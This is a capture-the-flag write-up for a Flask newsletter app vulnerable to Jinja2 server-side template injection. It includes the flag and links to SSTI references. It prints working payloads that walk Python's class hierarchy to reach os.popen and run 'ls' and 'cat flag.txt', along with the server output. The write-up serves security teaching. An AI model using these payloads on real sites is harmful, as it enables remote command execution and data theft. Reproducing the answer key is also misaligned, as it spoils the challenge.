# [__Stealthy Jinjas 🐱‍👤__](#)

## Description: 

* It's seems like a pretty simple site to hack into, but is it?

## Objective: 

* The data tha the user inputs is concanated directly to the jinja2 template. The user can list all the files using:
```
{{"".__class__.__mro__[1].__subclasses__()[185].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```
and they can see the `flag.txt` inside. Then they can read it by injecting:
```
{{"".__class__.__mro__[1].__subclasses__()[185].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```

## Flag: 🏁
* `INSSEC{n3Ver_trust_th3_us3rs_1nput!!}`

### Difficulty:
* Easy 

## Writeup
When we subscribe to the web app's newsletter we can see that our email is shown in the html of the page. We can assume that the string is concanated to the html. If we type `{{7*7}}` as an email we get as an answer `49`. This means that we can perform an injection attack on the web app which is called `SSTI (Server Side Template Injection)`. The web app uses Flask as its framework which uses Jinja 2 as a template engine. 

SSTI material:

[1] https://blog.nvisium.com/p263

[2] https://programmer.group/simple-understanding-of-flask-jinja2-server-side-template-injection-ssti.html

[3] https://0x00sec.org/t/explaining-server-side-template-injections/16297

[4] https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm

We search for the `warnings` subclass:
```
{% for i in range(200) %} 
{% set x = ''.__class__.__mro__[1].__subclasses__()[i] %} 
{% if "warning" in x.__name__ %}
{{ i }}
{{ x.__name__ }}
{% endif %}
{% endfor %}
```
output:
```
Thanks! We will be sure to send our news to : 185 catch_warnings
```
Execute `ls` command:
```
{{"".__class__.__mro__[1].__subclasses__()[185].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
```
output:
```
Thanks! We will be sure to send our news to : app.py flag.txt __pycache__: app.cpython-38.pyc templates: index.html
```
Read `flag.txt` file using `cat`:
```
{{"".__class__.__mro__[1].__subclasses__()[185].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```
output:
```
Thanks! We will be sure to send our news to : INSSEC{n3Ver_trust_th3_us3rs_1nput!!}
```
Nice! The flag is: `INSSEC{n3Ver_trust_th3_us3rs_1nput!!}`